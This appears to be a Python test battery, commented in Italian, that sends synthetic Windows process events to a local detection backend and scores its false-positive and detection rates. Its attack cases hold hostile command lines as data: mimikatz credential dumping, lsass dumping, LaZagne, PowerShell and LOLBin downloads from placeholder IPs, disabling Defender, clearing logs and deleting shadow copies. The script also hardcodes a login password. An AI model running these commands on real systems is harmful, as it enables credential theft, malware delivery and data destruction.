"""Batteria live DIFFICILE: misura l'efficacia reale di detection e rumore.

Tre livelli di casi, tutti inviati come eventi veri a un brain LIVE via agenti
enrolled con il flusso reale (token deploy -> /enroll -> segreto device):

- CLEAN  (~24): binari FIRMATI con uso legittimo (dev tool, LOLBin utili,
  query di sistema). Attesi ZERO alert. Misura il tasso di falsi positivi.
- ATTACK (~22): attacchi con evasione (offuscamento, LOLBin, masquerading,
  firmati o unsigned). Atteso ALMENO UN alert per caso. Misura la detection.
- DUALUSE (~8): strumenti legittimi in uso ambiguo. Nessun verdetto: in un
  prodotto reale sono triage, non FP puri. Riportati a parte.

Attribuzione per PID: ogni caso ha un pid unico, quindi ogni alert e' ricondotto
al caso esatto che lo ha generato. Percentuali finali: FP rate, detection rate,
accuratezza di severita' sui casi con mappatura nota.
"""
import requests, time, uuid, sys
from datetime import datetime, timezone

B = "http://127.0.0.1:8000"
RUN = int(time.time())

def fresh():
    s = requests.Session(); s.trust_env = False
    s.headers["Origin"] = "http://localhost:3000"
    return s

S = fresh()
r = S.post(f"{B}/api/v1/auth/login", json={"email":"aegis@aegis.prod","password":"010424CL"}, timeout=15)
assert r.status_code == 200, r.text[:200]
H = {"Authorization": f"Bearer {r.json()['access_token']}"}

def enroll(host):
    host = f"{host}-{RUN}"
    r = S.post(f"{B}/api/v1/deploy/token", headers=H,
               json={"label": f"hb-{host}", "agent_type": "nodetrace", "ttl_minutes": 30}, timeout=15)
    assert r.status_code == 200, f"deploy/token: {r.status_code} {r.text[:150]}"
    r = S.post(f"{B}/api/v1/enroll/enroll", json={
        "hostname": host, "os": "Windows", "enroll_key": r.json()["token"],
        "agent_type": "nodetrace"}, timeout=15)
    assert r.status_code == 200, f"enroll: {r.status_code} {r.text[:200]}"
    d = r.json()
    return d["agent_id"], d["agent_secret"]

AG_CLEAN, SEC_C = enroll("hb-clean")
AG_DUAL,  SEC_D = enroll("hb-dual")
AG_EVIL,  SEC_E = enroll("hb-evil")
AH = {AG_CLEAN: {"X-Agent-Id": AG_CLEAN, "Authorization": f"Bearer {SEC_C}"},
      AG_DUAL:  {"X-Agent-Id": AG_DUAL,  "Authorization": f"Bearer {SEC_D}"},
      AG_EVIL:  {"X-Agent-Id": AG_EVIL,  "Authorization": f"Bearer {SEC_E}"}}
print(f"agenti enrolled: clean={AG_CLEAN[:8]} dual={AG_DUAL[:8]} evil={AG_EVIL[:8]}")

MS   = ("authenticode-trusted", "Microsoft Corporation")
ECL  = ("authenticode-trusted", "Eclipse Adoptium")
OJS  = ("authenticode-trusted", "OpenJS Foundation")
CRL  = ("authenticode-trusted", "curl Foundation")
PSF  = ("authenticode-trusted", "Python Software Foundation")
GOO  = ("authenticode-trusted", "Google LLC")
UNS  = (None, None)

def sig(t):
    d = {}
    if t[0]: d["signature"] = t[0]
    if t[1]: d["publisher"] = t[1]
    return d

PF = "C:\\Program Files"
W  = "C:\\Windows\\System32"
T  = "C:\\Users\\dev\\AppData\\Local\\Temp"

# ─────────────────────────────── CLEAN: attesi ZERO alert ───────────────────
CLEAN = [
    ("vscode",        "Code.exe",      f"{PF}\\Microsoft VS Code\\Code.exe",              MS,  None),
    ("curl-dev",      "curl.exe",      f"{PF}\\Git\\mingw64\\bin\\curl.exe",              CRL, "curl.exe https://registry.npmjs.org/-/ping"),
    ("pwsh-getproc",  "pwsh.exe",      f"{PF}\\PowerShell\\7\\pwsh.exe",                  MS,  "pwsh.exe -Command Get-Process"),
    ("node",          "node.exe",      f"{PF}\\nodejs\\node.exe",                         OJS, None),
    ("npm",           "npm.cmd",       f"{PF}\\nodejs\\npm.cmd",                          OJS, None),
    ("git",           "git.exe",       f"{PF}\\Git\\bin\\git.exe",                        MS,  "git.exe status --short"),
    ("python",        "python.exe",    f"{PF}\\Python312\\python.exe",                    PSF, "python.exe -V"),
    ("pip",           "pip.exe",       f"{PF}\\Python312\\Scripts\\pip.exe",              PSF, "pip.exe --version"),
    ("chrome",        "chrome.exe",    f"{PF}\\Google\\Chrome\\Application\\chrome.exe",  GOO, None),
    ("msedge",        "msedge.exe",    f"{PF}\\Microsoft\\Edge\\Application\\msedge.exe", MS,  None),
    ("dotnet",        "dotnet.exe",    f"{PF}\\dotnet\\dotnet.exe",                       MS,  "dotnet.exe --info"),
    ("java",          "java.exe",      f"{PF}\\Eclipse Adoptium\\jdk\\bin\\java.exe",     ECL, "java.exe -version"),
    ("tasklist",      "tasklist.exe",  f"{W}\\tasklist.exe",                              MS,  None),
    ("netstat",       "netstat.exe",   f"{W}\\netstat.exe",                               MS,  "netstat.exe -ano"),
    ("ipconfig",      "ipconfig.exe",  f"{W}\\ipconfig.exe",                              MS,  "ipconfig.exe /all"),
    ("systeminfo",    "systeminfo.exe",f"{W}\\systeminfo.exe",                            MS,  None),
    ("whoami-plain",  "whoami.exe",    f"{W}\\whoami.exe",                                MS,  None),
    ("schtasks-q",    "schtasks.exe",  f"{W}\\schtasks.exe",                              MS,  "schtasks.exe /query /fo LIST"),
    ("reg-query",     "reg.exe",       f"{W}\\reg.exe",                                   MS,  "reg.exe query HKLM\\Software\\Microsoft"),
    ("tar",           "tar.exe",       f"{W}\\tar.exe",                                   MS,  "tar.exe -xf backup.tar"),
    ("ssh",           "ssh.exe",       f"{W}\\OpenSSH\\ssh.exe",                          MS,  "ssh.exe deploy@10.0.0.5"),
    ("wsl",           "wsl.exe",       f"{W}\\wsl.exe",                                   MS,  "wsl.exe --list"),
    ("cmd-echo",      "cmd.exe",       f"{W}\\cmd.exe",                                   MS,  "cmd.exe /c echo build ok"),
    ("certutil-encode","certutil.exe", f"{W}\\certutil.exe",                              MS,  "certutil.exe -encode in.txt out.txt"),
]

# ─────────────────────────────── ATTACK: atteso >=1 alert ───────────────────
# (nome, evento, severita' attesa o None = "basta che allerti")
ATTACKS = [
    ("mimikatz-temp",      dict(process_name="mimikatz.exe", process_path=f"{T}\\mimikatz.exe",
                                 command_line="mimikatz.exe sekurlsa::logonpasswords"), "CRITICAL"),
    ("mimikatz-renamed",   dict(process_name="svchost_.exe", process_path="C:\\Users\\dev\\AppData\\Roaming\\svchost_.exe",
                                 command_line="svchost_.exe sekurlsa::logonpasswords"), None),
    ("psh-enc-hidden",     dict(process_name="powershell.exe", process_path=f"{W}\\WindowsPowerShell\\v1.0\\powershell.exe",
                                 command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA."), None),
    ("psh-iex-variable",   dict(process_name="pwsh.exe", process_path=f"{PF}\\PowerShell\\7\\pwsh.exe",
                                 command_line="pwsh.exe -c \"$x='IEX';&$x((New-Object Net.WebClient).DownloadString('http://203.0.113.5/payload'))\""), None),
    ("certutil-urlcache",  dict(process_name="certutil.exe", process_path=f"{W}\\certutil.exe",
                                command_line="certutil.exe -urlcache -f http://203.0.113.9/a.exe %TEMP%\\a.exe"), None),
    ("bitsadmin-download", dict(process_name="bitsadmin.exe", process_path=f"{W}\\bitsadmin.exe",
                                command_line="bitsadmin.exe /transfer job1 http://203.0.113.9/x.exe %TEMP%\\x.exe"), None),
    ("regsvr32-squiblydoo",dict(process_name="regsvr32.exe", process_path=f"{W}\\regsvr32.exe",
                                command_line="regsvr32.exe /s /n /u /i:http://203.0.113.9/sct.dll scrobj.dll"), None),
    ("mshta-remote",       dict(process_name="mshta.exe", process_path=f"{W}\\mshta.exe",
                                command_line="mshta.exe http://203.0.113.9/x.hta"), None),
    ("rundll32-js",        dict(process_name="rundll32.exe", process_path=f"{W}\\rundll32.exe",
                                command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd /c calc",0,true)'), None),
    ("wmic-create-psh",    dict(process_name="wmic.exe", process_path=f"{W}\\wbem\\wmic.exe",
                                command_line='wmic.exe process call create "powershell -enc AAAA=="'), None),
    ("schtasks-temp-load", dict(process_name="schtasks.exe", process_path=f"{W}\\schtasks.exe",
                                command_line="schtasks.exe /create /tn OneDriveSync /tr \"%TEMP%\\svchost_.exe -s\" /sc onlogon"), "HIGH"),
    ("runkey-temp",        dict(process_name="reg.exe", process_path=f"{W}\\reg.exe",
                                command_line="reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpdater /t REG_SZ /d %TEMP%\\svc.exe /f"), "HIGH"),
    ("windefend-disable",  dict(process_name="cmd.exe", process_path=f"{W}\\cmd.exe",
                                command_line="cmd.exe /c sc config WinDefend start= disabled"), "CRITICAL"),
    ("taskkill-av",        dict(process_name="taskkill.exe", process_path=f"{W}\\taskkill.exe",
                                command_line="taskkill.exe /F /IM MsMpEng.exe"), "CRITICAL"),
    ("wevtutil-cl",        dict(process_name="wevtutil.exe", process_path=f"{W}\\wevtutil.exe",
                                command_line="wevtutil.exe cl Security"), "CRITICAL"),
    ("bcdedit-recovery",   dict(process_name="bcdedit.exe", process_path=f"{W}\\bcdedit.exe",
                                command_line="bcdedit.exe /set recoveryenabled no"), "CRITICAL"),
    ("wbadmin-catalog",    dict(process_name="wbadmin.exe", process_path=f"{W}\\wbadmin.exe",
                                command_line="wbadmin.exe delete catalog -quiet"), "CRITICAL"),
    ("vssadmin-shadows",   dict(process_name="vssadmin.exe", process_path=f"{W}\\vssadmin.exe",
                                command_line="vssadmin.exe delete shadows /all /quiet"), "CRITICAL"),
    ("procdump-lsass",     dict(process_name="procdump.exe", process_path=f"{T}\\procdump.exe",
                                command_line="procdump.exe -ma lsass.exe out.dmp"), "CRITICAL"),
    ("pth-sekurlsa",       dict(process_name="mimidog.exe", process_path=f"{T}\\mimidog.exe",
                                command_line="mimidog.exe sekurlsa::pth /user:admin /ntlm:HASH"), "CRITICAL"),  # token sekurlsa ora in CREDENTIAL_TOOLS
    ("lazagne",            dict(process_name="laZagne.exe", process_path=f"{T}\\laZagne.exe",
                                command_line="laZagne.exe all"), "CRITICAL"),
    ("unsigned-dropper",   dict(process_name="update_agent.exe", process_path=f"{T}\\update_agent.exe"), "HIGH"),
    ("masq-svchost",       dict(process_name="svchost.exe", process_path="C:\\Users\\dev\\AppData\\Roaming\\svchost.exe"), "CRITICAL"),
]

# ─────────────────────────────── DUALUSE: triage, non FP ────────────────────
DUALUSE = [
    ("whoami-all",     dict(process_name="whoami.exe",   process_path=f"{W}\\whoami.exe",   **sig(MS), command_line="whoami.exe /all")),
    ("net-user",       dict(process_name="net.exe",      process_path=f"{W}\\net.exe",      **sig(MS), command_line="net.exe user")),
    ("schtasks-backup",dict(process_name="schtasks.exe", process_path=f"{W}\\schtasks.exe", **sig(MS), command_line="schtasks.exe /create /tn NightlyBackup /tr \"%PF%\\backup.cmd\" /sc daily")),
    ("reg-run-installer",dict(process_name="reg.exe",    process_path=f"{W}\\reg.exe",      **sig(MS), command_line="reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyInstaller /t REG_SZ /d \"%PF%\\MyApp\\app.exe\" /f")),
    ("psexec-remote",  dict(process_name="psexec.exe",   process_path=f"{PF}\\Sysinternals\\psexec.exe", **sig(MS), command_line="psexec.exe \\\\10.0.0.9 cmd.exe")),
    ("7z-archive",     dict(process_name="7z.exe",       process_path=f"{PF}\\7-Zip\\7z.exe", **sig(("authenticode-trusted","Igor Pavlov")), command_line="7z.exe a -p backup.7z docs\\")),
    ("bitsadmin-msu",  dict(process_name="bitsadmin.exe",process_path=f"{W}\\bitsadmin.exe", **sig(MS), command_line="bitsadmin.exe /transfer upd http://download.microsoft.com/update.msu %TEMP%\\update.msu")),
    ("python-socket",  dict(process_name="python.exe",   process_path=f"{PF}\\Python312\\python.exe", **sig(PSF), command_line="python.exe -c \"import socket;socket.gethostbyname('example.com')\"")),
]

# ─────────────────────────────── INVIO ──────────────────────────────────────
errors = []
def send(agent_id, name, ev):
    payload = {"agent_id": agent_id, "event_id": str(uuid.uuid4()),
               "timestamp": datetime.now(timezone.utc).isoformat(),
               "event_type": "PROCESS_CREATED", "pid": ev.get("_pid", 10000), **ev}
    r = S.post(f"{B}/api/v1/telemetry/report", json=payload, headers=AH[agent_id], timeout=15)
    if r.status_code != 200:
        errors.append((name, r.status_code, r.text[:120]))
    return r.status_code

pid = 20000
clean_pids = {}
for name, proc, path, st, cmd in CLEAN:
    pid += 1; clean_pids[name] = pid
    send(AG_CLEAN, name, {"_pid": pid, "process_name": proc, "process_path": path,
                          **sig(st), **({"command_line": cmd} if cmd else {})})

dual_pids = {}
for name, ev in DUALUSE:
    pid += 1; dual_pids[name] = pid
    send(AG_DUAL, name, {"_pid": pid, **ev})

attack_pids = {}
for name, ev, sev in ATTACKS:
    pid += 1; attack_pids[name] = pid
    send(AG_EVIL, name, {"_pid": pid, **ev, **sig(UNS)})

# gli attacchi "firmati" che sfruttano tool legittimi (LOLBin signed abuse):
EV_BY_NAME = {name: ev for name, ev, _sev in ATTACKS}
for name in ("certutil-urlcache", "bitsadmin-download", "regsvr32-squiblydoo",
             "mshta-remote", "rundll32-js", "wmic-create-psh", "schtasks-temp-load",
             "runkey-temp", "windefend-disable", "taskkill-av", "wevtutil-cl",
             "bcdedit-recovery", "wbadmin-catalog", "vssadmin-shadows"):
    ev = dict(EV_BY_NAME[name]); ev["_pid"] = attack_pids[name]
    send(AG_EVIL, name + "[signed]", {**ev, **sig(MS)})

time.sleep(3)

def alerts_for(agent_id):
    r = S.get(f"{B}/api/v1/telemetry/alerts?limit=1000", headers=H, timeout=15)
    assert r.status_code == 200, r.text[:200]
    return [a for a in r.json() if str(a.get("agent_id")) == agent_id]

al_clean = alerts_for(AG_CLEAN)
al_dual  = alerts_for(AG_DUAL)
al_evil  = alerts_for(AG_EVIL)
by_pid_evil = {}
for a in al_evil:
    by_pid_evil.setdefault(a.get("pid"), []).append(a)

# ─────────────────────────────── VERDICT ────────────────────────────────────
print("\n=== CLEAN (falsi positivi: attesi ZERO) ===")
fps = []
for name, proc, path, st, cmd in CLEAN:
    hits = [a for a in al_clean if a.get("pid") == clean_pids[name]]
    if hits:
        fps.append((name, hits[0].get("severity"), str(hits[0].get("description"))[:90]))
for f in fps: print(f"  FP  {f[0]:<18} {f[1]:<8} {f[2]}")
print(f"  -> {len(fps)}/{len(CLEAN)} FP  ({len(fps)/len(CLEAN)*100:.1f}%)")

print("\n=== ATTACK (atteso >=1 alert) ===")
detected, missed, sev_ok, sev_bad = 0, [], 0, []
for name, ev, sev in ATTACKS:
    # il duplicato "firmato" riusa lo stesso pid: gli alert si aggregano lì
    hits = by_pid_evil.get(attack_pids[name], [])
    if not hits:
        missed.append(name); continue
    detected += 1
    if sev:
        if any(a.get("severity") == sev for a in hits): sev_ok += 1
        else: sev_bad.append((name, sev, sorted({a.get("severity") for a in hits})))
print(f"  -> detection {detected}/{len(ATTACKS)} ({detected/len(ATTACKS)*100:.1f}%)")
if missed:   print("  MISSED:", ", ".join(missed))
if sev_bad:  print("  SEVERITA' sbagliata:", sev_bad)

print("\n=== DUALUSE (informativo, triage) ===")
for name, ev in DUALUSE:
    hits = [a for a in al_dual if a.get("pid") == dual_pids[name]]
    mark = f"ALERT {hits[0].get('severity')}" if hits else "silenzioso"
    print(f"  {name:<18} -> {mark}")

print("\n=== ERRORI DI REPORT (schema/4xx) ===")
for e in errors: print("  ", e)

fp_rate = len(fps)/len(CLEAN)*100
det_rate = detected/len(ATTACKS)*100
print(f"\nRISULTATO: FP {fp_rate:.1f}%  |  DETECTION {det_rate:.1f}%  |  severita' ok {sev_ok}/{sev_ok+len(sev_bad)}  |  report-errors {len(errors)}")
sys.exit(0)
